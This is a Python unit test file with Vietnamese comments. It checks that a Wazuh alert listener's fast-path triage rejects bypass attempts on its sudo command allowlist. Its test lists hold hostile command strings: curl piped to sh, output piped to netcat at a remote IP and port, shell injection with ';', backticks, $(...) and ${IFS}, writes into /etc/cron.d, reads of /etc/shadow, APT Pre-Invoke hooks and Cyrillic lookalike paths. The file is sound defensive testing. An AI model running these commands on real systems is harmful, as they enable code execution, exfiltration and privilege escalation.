"""
Test bypass cho fast_path_triage (wazuh_listener.py).

Nguyên tắc: fast-path chỉ được trả verdict benign cho lệnh KHỚP CHÍNH XÁC
danh sách cho phép, do user quản trị hợp lệ chạy, từ đúng rule sudo-root.
Mọi trường hợp còn lại phải trả None để chuyển sang ReAct Agent.

Chạy: python -m unittest tests/test_fast_path_bypass.py -v
"""
import unittest

# ============================ ADAPTER ============================
from wazuh_listener import fast_path_triage

ADMIN_USER = "admin"          # user có trong baseline.json
BENIGN_KEYS = ("benign_likely",)  # giá trị verdict mà fast-path trả khi an toàn


def make_alert(command, user=ADMIN_USER, rule_id="5402", level=3, extra_log=""):
    """Dựng alert Wazuh giả."""
    full_log = (
        f"Oct 24 10:00:00 lab sudo:   {user} : TTY=pts/0 ; PWD=/home/{user} ; "
        f"USER=root ; COMMAND={command}{extra_log}"
    )
    return {
        "rule": {"id": rule_id, "level": level},
        "agent": {"name": "lab-ubuntu"},
        "data": {"srcuser": user, "dstuser": "root", "command": command},
        "full_log": full_log,
    }


def is_benign(result):
    """Chỉnh theo kiểu giá trị trả về của fast_path_triage."""
    if result is None:
        return False
    verdict = result.get("verdict") if isinstance(result, dict) else result
    return verdict in BENIGN_KEYS
# =================================================================


class TestFastPathAllowed(unittest.TestCase):
    """Lệnh bảo trì hợp lệ phải đi đường nhanh."""

    def test_exact_allowed_commands(self):
        for cmd in (
            "/usr/bin/apt update",
            "/usr/sbin/ufw status",
        ):
            with self.subTest(cmd=cmd):
                self.assertTrue(is_benign(fast_path_triage(make_alert(cmd))))


class TestFastPathBypass(unittest.TestCase):
    """Mọi biến thể dưới đây KHÔNG được fast-path (phải trả None / không benign)."""

    def assertNotFast(self, alert, msg=""):
        self.assertFalse(is_benign(fast_path_triage(alert)), msg)

    # --- 1. Tham số/tùy chọn thừa sau lệnh hợp lệ ---
    def test_extra_options(self):
        for cmd in (
            "/usr/bin/apt update -o APT::Update::Pre-Invoke::=/tmp/x.sh",
            "/usr/bin/apt update --option Dpkg::Pre-Invoke=/tmp/x",
            "/usr/bin/apt update -c /tmp/evil.conf",
            "/usr/sbin/ufw status verbose",
            "/usr/bin/tail /var/log/syslog /etc/shadow",
            "/usr/bin/tail -f /var/log/syslog",
        ):
            with self.subTest(cmd=cmd):
                self.assertNotFast(make_alert(cmd))

    # --- 2. Khớp tiền tố ---
    def test_prefix_match(self):
        for cmd in (
            "/usr/bin/apt updatex",
            "/usr/bin/apt update-evil",
            "/usr/bin/apt updates",
            "/usr/sbin/ufw statusx",
        ):
            with self.subTest(cmd=cmd):
                self.assertNotFast(make_alert(cmd))

    # --- 3. Dịch vụ lạ trong systemctl restart ---
    def test_unknown_service(self):
        for cmd in (
            "/usr/bin/systemctl restart evil.service",
            "/usr/bin/systemctl restart nginx evil.service",
            "/usr/bin/systemctl restart ../../tmp/evil",
            "/usr/bin/systemctl start nginx",
            "/usr/bin/systemctl disable ufw",
        ):
            with self.subTest(cmd=cmd):
                self.assertNotFast(make_alert(cmd))

    # --- 4. Ký tự điều khiển shell và biến thể mã hóa ---
    def test_shell_metacharacters(self):
        for cmd in (
            "/usr/bin/apt update; /bin/bash",
            "/usr/bin/apt update && curl http://x/s | sh",
            "/usr/bin/apt update || id",
            "/usr/bin/apt update | nc 10.0.0.9 4444",
            "/usr/bin/apt update > /etc/cron.d/x",
            "/usr/bin/apt update `id`",
            "/usr/bin/apt update $(id)",
            "/usr/bin/apt${IFS}update",
            "/usr/bin/apt\tupdate",
            "/usr/bin/apt update\n/bin/bash",
            "/usr/bin/apt update\r\n/bin/bash",
            "/usr/bin/apt  update",       # hai dấu cách
            "/usr/bin/apt update ",       # khoảng trắng cuối
            "/usr/bin/apt update\x00/bin/sh",
        ):
            with self.subTest(cmd=repr(cmd)):
                self.assertNotFast(make_alert(cmd))

    # --- 5. Đường dẫn giả mạo / ký tự lookalike ---
    def test_path_and_lookalike(self):
        for cmd in (
            "/tmp/apt update",
            "./apt update",
            "apt update",                         # không đường dẫn tuyệt đối
            "/usr/local/bin/apt update",
            "/usr/bin/apt update".replace("a", "\u0430", 1),  # 'а' Cyrillic
            "/usr/bin/apt updаte",                # 'а' Cyrillic trong update
            "/usr/bin/../../tmp/apt update",
        ):
            with self.subTest(cmd=repr(cmd)):
                self.assertNotFast(make_alert(cmd))

    # --- 6. Lệnh nguy hiểm hiển nhiên ---
    def test_dangerous_commands(self):
        for cmd in (
            "/bin/bash",
            "/bin/sh -c id",
            "/usr/bin/su -",
            "/usr/sbin/ufw disable",
            "/usr/sbin/ufw reset",
            "/usr/bin/vi /etc/sudoers",
            "/usr/sbin/visudo",
            "/usr/bin/python3 -c 'import os'",
        ):
            with self.subTest(cmd=cmd):
                self.assertNotFast(make_alert(cmd))

    # --- 7. Ngữ cảnh: user, rule, log injection ---
    def test_wrong_user(self):
        for user in ("www-data", "backup", "intruder", "root", ""):
            with self.subTest(user=user):
                self.assertNotFast(make_alert("/usr/bin/apt update", user=user))

    def test_wrong_rule(self):
        for rid, lvl in (("5401", 5), ("5404", 10), ("5405", 5), ("5712", 10), ("550", 7)):
            with self.subTest(rule=rid):
                self.assertNotFast(make_alert("/usr/bin/apt update", rule_id=rid, level=lvl))

    def test_log_injection_second_command(self):
        # Kẻ tấn công nhét thêm "COMMAND=" thứ hai vào cuối log.
        alert = make_alert(
            "/usr/bin/apt update",
            extra_log=" ; COMMAND=/bin/bash",
        )
        self.assertNotFast(alert, "Log có nhiều COMMAND= phải bị loại khỏi fast-path")

    def test_field_mismatch(self):
        # Trường data.command nói một đằng, full_log nói một nẻo.
        alert = make_alert("/usr/bin/apt update")
        alert["data"]["command"] = "/bin/bash"
        self.assertNotFast(alert, "Hai nguồn lệnh không khớp phải bị loại")

    def test_malformed_alert(self):
        for alert in ({}, {"rule": {}}, {"rule": {"id": "5402"}, "full_log": ""},
                      {"rule": {"id": "5402"}, "full_log": "COMMAND="}):
            with self.subTest(alert=alert):
                try:
                    self.assertNotFast(alert)
                except Exception as exc:  # không được crash listener
                    self.fail(f"fast_path_triage ném ngoại lệ: {exc!r}")


if __name__ == "__main__":
    unittest.main()
